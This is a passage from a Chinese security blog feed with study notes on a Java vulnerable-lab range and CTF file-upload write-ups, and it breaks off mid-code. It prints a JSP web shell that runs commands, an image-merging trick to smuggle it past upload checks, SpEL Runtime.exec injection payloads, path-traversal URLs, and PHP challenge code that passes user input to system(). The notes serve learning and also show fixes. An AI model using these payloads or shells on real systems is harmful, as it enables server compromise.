&#125;</span><br><span class="line"></span><br><span class="line">       if (temp.contains(&quot;..&quot;) || temp.charAt(0) == &#x27;/&#x27;) &#123;</span><br><span class="line">           return null;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return filepath;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>对文件路径参数增加了过滤方法pathFilter，如果文件路径开头为&#x2F;字符或者存在..连续字符出现就返回空字符串，但是这种过滤只是简单的应对措施，如果是Windows操作系统上以盘符开始的路径，就显得无能为力。例如使用\读取（windows下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path_traversal/sec?filepath=..\..\..\..\..\windows\win.ini</span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="1-file-upload"><a href="#1-file-upload" class="headerlink" title="1.&#x2F;file&#x2F;upload"></a>1.&#x2F;file&#x2F;upload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/upload&quot;)</span><br><span class="line">public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,</span><br><span class="line">                               RedirectAttributes redirectAttributes) &#123;</span><br><span class="line">    if (file.isEmpty()) &#123;</span><br><span class="line">        // 赋值给uploadStatus.html里的动态参数message</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);</span><br><span class="line">        return &quot;redirect:/file/status&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        // Get the file and save it somewhere</span><br><span class="line">        byte[] bytes = file.getBytes();</span><br><span class="line">        Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;,</span><br><span class="line">                &quot;You successfully uploaded &#x27;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;redirect:/file/status&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件上传到方法中，未判断文件的类型、扩展名等信息，也未对生成文件的文件名进行重置，只是直接将文件上传到文件保存目录中，使用测试文件成功上传。构造一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;))) &#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); &#125; %&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存为shell.jsp进行上传，然后传入参数pwd&#x3D;pass&amp;cmd&#x3D;whoami</p><p>修复代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/upload/picture&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;</span><br><span class="line">    if (multifile.isEmpty()) &#123;</span><br><span class="line">        return &quot;Please select a file to upload&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String fileName = multifile.getOriginalFilename();</span><br><span class="line">    String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名</span><br><span class="line">    String mimeType = multifile.getContentType(); // 获取MIME类型</span><br><span class="line">    String filePath = UPLOADED_FOLDER + fileName;</span><br><span class="line">    File excelFile = convert(multifile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 判断文件后缀名是否在白名单内  校验1</span><br><span class="line">    String[] picSuffixList = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">    boolean suffixFlag = false;</span><br><span class="line">    for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">        if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">            suffixFlag = true;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!suffixFlag) &#123;</span><br><span class="line">        logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 判断MIME类型是否在黑名单内 校验2</span><br><span class="line">    String[] mimeTypeBlackList = &#123;</span><br><span class="line">            &quot;text/html&quot;,</span><br><span class="line">            &quot;text/javascript&quot;,</span><br><span class="line">            &quot;application/javascript&quot;,</span><br><span class="line">            &quot;application/ecmascript&quot;,</span><br><span class="line">            &quot;text/xml&quot;,</span><br><span class="line">            &quot;application/xml&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">    for (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">        // 用contains是为了防止text/html;charset=UTF-8绕过</span><br><span class="line">        if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">            logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 判断文件内容是否是图片 校验3</span><br><span class="line">    boolean isImageFlag = isImage(excelFile);</span><br><span class="line">    deleteFile(randomFilePath);</span><br><span class="line"></span><br><span class="line">    if (!isImageFlag) &#123;</span><br><span class="line">        logger.error(&quot;[-] File is not Image&quot;);</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        // Get the file and save it somewhere</span><br><span class="line">        byte[] bytes = multifile.getBytes();</span><br><span class="line">        Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">    logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">    return String.format(&quot;You successfully uploaded &#x27;%s&#x27;&quot;, filePath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>判断为图片才允许上传，不过仍可通过其他方式绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png/shell.jsp muma.png</span><br></pre></td></tr></table></figure><h3 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h3><p>Spring表达式语言（简称 <strong>SpEL</strong>，全称<strong>Spring Expression Language</strong>）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。</p><p>spel语法中的<code>T()</code>操作符 , <code>T()</code>操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法<code>T(全限定类名).方法名()</code></p><h4 id="1-spel-vuln1"><a href="#1-spel-vuln1" class="headerlink" title="1.&#x2F;spel&#x2F;vuln1"></a>1.&#x2F;spel&#x2F;vuln1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/spel/vuln1&quot;)</span><br><span class="line"> public String spel_vuln1(String value) &#123;</span><br><span class="line">     ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">     return parser.parseExpression(value).getValue().toString();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以通过spel表达式实现命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><h4 id="2-spel-vuln2"><a href="#2-spel-vuln2" class="headerlink" title="2.&#x2F;spel&#x2F;vuln2"></a>2.&#x2F;spel&#x2F;vuln2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;spel/vuln2&quot;)</span><br><span class="line">    public String spel_vuln2(String value) &#123;</span><br><span class="line">        StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">        SpelExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Expression expression = parser.parseExpression(value, new TemplateParserContext());</span><br><span class="line">        Object x = expression.getValue(context);    // trigger vulnerability point</span><br><span class="line">        return x.toString();   // response</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>比第一关多了一个模板引擎，用#{}套上就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>修复代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;spel/sec&quot;)</span><br><span class="line">  public String spel_sec(String value) &#123;</span><br><span class="line">      SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();</span><br><span class="line">      SpelExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">      Expression expression = parser.parseExpression(value, new TemplateParserContext());</span><br><span class="line">      Object x = expression.getValue(context);</span><br><span class="line">      return x.toString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 SimpleEvaluationContext进行加固，定义一个只读的上下文环境防止不安全的操作</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;靶场需访问&lt;a href=&quot;http://localhost:8080/index&quot;&gt;http://localhost:8080/index&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;默认账号密码为admin admin123&lt;/p&gt;
&lt;p&gt;题目在源码里（亏我找半天）&lt;/p&gt;
&lt;p&gt;由于后面环</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://kinseyy.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="java" scheme="https://kinseyy.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-文件上传</title>
    <link href="https://kinseyy.github.io/2025/06/24/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://kinseyy.github.io/2025/06/24/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2025-06-24T08:18:32.000Z</published>
    <updated>2025-06-24T08:34:29.523Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web151（前端认证）"><a href="#web151（前端认证）" class="headerlink" title="web151（前端认证）"></a>web151（前端认证）</h3><p>题目提示是前端认证，我们直接上传一句话木马图片，然后把图片后缀改为php</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506241620574.png" alt="image-20250624162008453" loading="lazy"></p><p>上传成功后连蚁剑，</p><p>得到flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506241624195.png" alt="image-20250624162443112" loading="lazy"></p><h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>跟上题做法一样，上传一句话木马图片，修改后缀为php，然后连蚁剑就可以了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;web151（前端认证）&quot;&gt;&lt;a href=&quot;#web151（前端认证）&quot; class=&quot;headerlink&quot; title=&quot;web151（前端认证）&quot;&gt;&lt;/a&gt;web151（前端认证）&lt;/h3&gt;&lt;p&gt;题目提示是前端认证，我们直接上传一句话木马图片，然后把图片后</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[SUCTF 2019]Upload Labs 2</title>
    <link href="https://kinseyy.github.io/2025/05/21/SUCTF-2019-Upload-Labs-2/"/>
    <id>https://kinseyy.github.io/2025/05/21/SUCTF-2019-Upload-Labs-2/</id>
    <published>2025-05-21T12:31:20.000Z</published>
    <updated>2025-05-21T13:49:59.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs <strong>2</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$clazz</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$instance</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$clazz</span>, <span class="variable">$func1</span>, <span class="variable">$func2</span>, <span class="variable">$func3</span>, <span class="variable">$arg1</span>, <span class="variable">$arg2</span>, <span class="variable">$arg3</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;clazz = <span class="variable">$clazz</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func1 = <span class="variable">$func1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func2 = <span class="variable">$func2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func3 = <span class="variable">$func3</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg1 = <span class="variable">$arg1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg2 = <span class="variable">$arg2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg3 = <span class="variable">$arg3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable language_">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;instance = <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">newInstanceArgs</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable language_">$this</span>-&gt;clazz, <span class="variable language_">$this</span>-&gt;func1);</span><br><span class="line">        <span class="variable">$reflectionMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable language_">$this</span>-&gt;clazz, <span class="variable language_">$this</span>-&gt;func2);</span><br><span class="line">        <span class="variable">$reflectionMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable language_">$this</span>-&gt;clazz, <span class="variable language_">$this</span>-&gt;func3);</span><br><span class="line">        <span class="variable">$reflectionMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$clazz</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;clazz&#x27;</span>];</span><br><span class="line">        <span class="variable">$func1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;func1&#x27;</span>];</span><br><span class="line">        <span class="variable">$func2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;func2&#x27;</span>];</span><br><span class="line">        <span class="variable">$func3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;func3&#x27;</span>];</span><br><span class="line">        <span class="variable">$arg1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;arg1&#x27;</span>];</span><br><span class="line">        <span class="variable">$arg2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line">        <span class="variable">$arg2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;arg3&#x27;</span>];</span><br><span class="line">        <span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Ad</span>(<span class="variable">$cmd</span>, <span class="variable">$clazz</span>, <span class="variable">$func1</span>, <span class="variable">$func2</span>, <span class="variable">$func3</span>, <span class="variable">$arg1</span>, <span class="variable">$arg2</span>, <span class="variable">$arg3</span>);</span><br><span class="line">        <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You r not admin!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们来看代码，在ad类的析构函数中存在一个rce函数，所以我们的目的是能够执行它</p><p>想要通过if，我们需要进行ssrf，同时为了到达命令执行的点，我们还需要通过check函数的检查 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable language_">$this</span>-&gt;clazz);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;instance = <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">newInstanceArgs</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable language_">$this</span>-&gt;clazz, <span class="variable language_">$this</span>-&gt;func1);</span><br><span class="line">    <span class="variable">$reflectionMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable language_">$this</span>-&gt;clazz, <span class="variable language_">$this</span>-&gt;func2);</span><br><span class="line">    <span class="variable">$reflectionMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable language_">$this</span>-&gt;clazz, <span class="variable language_">$this</span>-&gt;func3);</span><br><span class="line">    <span class="variable">$reflectionMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里通过反射来调用类的方法，我们可以找一个存在单参数方法的原生类，这里用到了SplDoublyLinkedList::unshift</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505212046219.png" alt="image-20250521204615041" loading="lazy"></p><p>我们在func.php发现下面代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go away!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$file_path</span>);</span><br><span class="line">        <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getMIME</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your file type is &#x27;<span class="subst">$file</span>&#x27; &lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跟进getMIME，我们进入class.php（文件从github下下来的）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 